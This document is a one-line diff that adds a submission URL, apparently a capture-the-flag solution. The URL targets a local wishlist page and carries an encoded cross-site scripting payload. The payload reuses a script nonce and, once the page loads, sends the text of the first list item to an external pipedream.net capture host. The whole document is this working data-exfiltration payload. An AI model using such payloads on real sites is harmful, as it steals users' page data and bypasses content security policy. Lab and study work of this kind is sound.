@@ -1,0 +1,1 @@
+Submit: http://localhost:8080/wishlist?msg2=X%3Cscript%20nonce=%222726c7f26c%22%3Edocument.addEventListener(%27DOMContentLoaded%27,()=%3E{window.location=%27https://en40us32pzu2c.x.pipedream.net/%27%2Bdocument.querySelector(%27li%27).innerText%3B})%3C/script%3E
